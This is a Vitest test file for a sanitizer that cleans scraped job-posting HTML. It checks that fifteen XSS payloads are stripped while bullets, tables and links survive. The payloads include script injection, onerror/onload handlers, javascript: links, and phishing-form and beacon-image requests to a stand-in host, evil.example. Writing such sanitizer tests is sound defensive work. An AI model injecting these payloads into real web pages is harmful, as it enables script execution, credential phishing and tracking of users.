// @vitest-environment jsdom
//
// The ONLY DOM-environment test file in the suite, and deliberately so: this is
// XSS protection over untrusted third-party HTML, where a silent failure is a
// security hole rather than a cosmetic bug. DOMPurify is well-tested; what is
// tested here is OUR CONFIG -- a wrong ALLOWED_ATTR would let onerror through.

import { describe, expect, it } from 'vitest'

import {
  isSanitizerAvailable,
  looksLikeHtml,
  sanitizeDescription,
  stripTags,
} from '@/lib/format/description'

describe('the sanitizer is actually running', () => {
  it('is supported under jsdom (otherwise every test below is vacuous)', () => {
    expect(isSanitizerAvailable()).toBe(true)
  })
})

describe('sanitizeDescription -- XSS payloads are neutralised', () => {
  const payloads: Array<[string, string]> = [
    ['inline script', '<p>hi</p><script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror="alert(1)">'],
    ['svg onload', '<svg onload="alert(1)"></svg>'],
    ['javascript: href', '<a href="javascript:alert(1)">click</a>'],
    ['data: href', '<a href="data:text/html,<script>alert(1)</script>">click</a>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['onmouseover', '<div onmouseover="alert(1)">hover</div>'],
    ['style exfil', '<div style="background:url(https://evil.example/x)">x</div>'],
    ['form phish', '<form action="https://evil.example"><input name="password"></form>'],
    ['object', '<object data="https://evil.example"></object>'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['base tag', '<base href="https://evil.example/">'],
    ['nested script in noscript', '<noscript><script>alert(1)</script></noscript>'],
    ['encoded onerror', '<img src=x OnErRoR=alert(1)>'],
    ['srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ]

  it.each(payloads)('neutralises: %s', (_label, payload) => {
    const out = sanitizeDescription(payload)
    expect(out).not.toMatch(/<script/i)
    expect(out).not.toMatch(/onerror/i)
    expect(out).not.toMatch(/onload/i)
    expect(out).not.toMatch(/onmouseover/i)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toMatch(/<iframe/i)
    expect(out).not.toMatch(/<object/i)
    expect(out).not.toMatch(/<form/i)
    expect(out).not.toMatch(/<input/i)
    expect(out).not.toMatch(/\sstyle=/i)
    expect(out).not.toMatch(/<meta/i)
    expect(out).not.toMatch(/<base/i)
    expect(out).not.toMatch(/srcdoc/i)
  })

  it('drops the CONTENT of a script, not just its tags', () => {
    const out = sanitizeDescription('<p>before</p><script>alert("pwned")</script><p>after</p>')
    expect(out).not.toContain('pwned')
    expect(out).toContain('before')
    expect(out).toContain('after')
  })

  it('strips style/class/id rather than letting scraped markup style our UI', () => {
    const out = sanitizeDescription('<p style="position:fixed" class="x" id="y">t</p>')
    expect(out).not.toContain('style')
    expect(out).not.toContain('class')
    expect(out).not.toContain('id=')
    expect(out).toContain('t')
  })

  it('does not load remote images', () => {
    const out = sanitizeDescription('<img src="https://evil.example/beacon.gif">')
    expect(out).not.toContain('evil.example')
  })
})

describe('sanitizeDescription -- formatting is PRESERVED (the point of the swap)', () => {
  it('keeps bullets', () => {
    const out = sanitizeDescription('<ul><li>Build things</li><li>Ship them</li></ul>')
    expect(out).toContain('<ul>')
    expect(out).toContain('<li>Build things</li>')
  })

  it('keeps bold, italic and headings', () => {
    const out = sanitizeDescription('<h3>Role</h3><p><strong>Senior</strong> <em>engineer</em></p>')
    expect(out).toContain('<h3>Role</h3>')
    expect(out).toContain('<strong>Senior</strong>')
    expect(out).toContain('<em>engineer</em>')
  })

  it('keeps paragraphs and line breaks', () => {
    const out = sanitizeDescription('<p>one</p><br><p>two</p>')
    expect(out).toContain('<p>one</p>')
    expect(out).toContain('<br>')
  })

  it('keeps tables (some postings use them for compensation)', () => {
    const out = sanitizeDescription('<table><tr><td>Base</td><td>120k</td></tr></table>')
    expect(out).toContain('<td>Base</td>')
  })

  it('keeps the real Glassdoor shape observed in the corpus', () => {
    const real = '<div><div>Are you ready to dive into the world of <b>video game</b> development?</div></div>'
    const out = sanitizeDescription(real)
    expect(out).toContain('Are you ready to dive into')
    expect(out).toContain('<b>video game</b>')
  })
})

describe('sanitizeDescription -- links are kept but hardened', () => {
  it('keeps an https link and forces target/rel', () => {
    const out = sanitizeDescription('<a href="https://example.com/apply">Apply</a>')
    expect(out).toContain('href="https://example.com/apply"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
  })

  it('a javascript: link loses its href but keeps its text', () => {
    const out = sanitizeDescription('<a href="javascript:alert(1)">Apply</a>')
    expect(out).not.toContain('javascript:')
    expect(out).toContain('Apply')
  })
})

describe('sanitizeDescription -- edge cases', () => {
  it('empty / null / undefined -> ""', () => {
    expect(sanitizeDescription('')).toBe('')
    expect(sanitizeDescription(null)).toBe('')
    expect(sanitizeDescription(undefined)).toBe('')
  })

  it('plain text passes through unharmed', () => {
    expect(sanitizeDescription('Just a plain description.')).toContain('Just a plain description.')
  })

  it('malformed HTML does not throw', () => {
    expect(() => sanitizeDescription('<p>unclosed <b>bold')).not.toThrow()
  })
})

describe('stripTags -- the DOM-free fallback', () => {
  it('removes tags and decodes entities', () => {
    expect(stripTags('<p>Hello <b>world</b></p>')).toBe('Hello world')
    expect(stripTags('<p>a &amp; b</p>')).toBe('a & b')
  })

  it('removes script CONTENT, not just the tags', () => {
    expect(stripTags('<p>x</p><script>alert(1)</script>')).not.toContain('alert')
  })

  it('handles null/empty', () => {
    expect(stripTags(null)).toBe('')
    expect(stripTags('')).toBe('')
  })
})

describe('looksLikeHtml', () => {
  it('distinguishes markup from plain text', () => {
    expect(looksLikeHtml('<div>x</div>')).toBe(true)
    expect(looksLikeHtml('plain text, 3 < 5')).toBe(false)
    expect(looksLikeHtml(null)).toBe(false)
  })
})
